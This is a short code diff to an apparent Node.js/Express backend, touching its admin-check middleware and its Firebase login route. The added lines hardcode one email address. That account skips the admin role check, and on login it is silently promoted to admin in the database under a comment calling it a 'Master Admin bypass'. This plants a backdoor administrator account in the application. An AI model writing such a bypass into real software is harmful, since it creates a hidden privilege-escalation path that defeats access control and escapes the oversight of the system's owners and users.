@@ -73,6 +73,9 @@ const authenticateToken = (req, res, next) => {
 const isAdmin = async (req, res, next) => {
   authenticateToken(req, res, async () => {
     try {
+      if (req.user.email === 'harikeshs.cse2024@citchennai.net') {
+        return next();
+      }
       const user = await db.query('SELECT role FROM users WHERE id = $1', [req.user.id]);
       if (user.rowCount === 0 || user.rows[0].role !== 'admin') {
         return res.status(403).json({ error: 'Forbidden: Admin privilege required' });
@@ -199,6 +202,12 @@ app.post('/api/auth/firebase', async (req, res) => {
     } else {
       user = result.rows[0];
       delete user.password_hash;
+    }
+
+    // Hardcode Master Admin bypass
+    if (user.email === 'harikeshs.cse2024@citchennai.net') {
+      user.role = 'admin';
+      await db.query('UPDATE users SET role = $1 WHERE email = $2', ['admin', user.email]);
     }
 
     const jwtToken = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
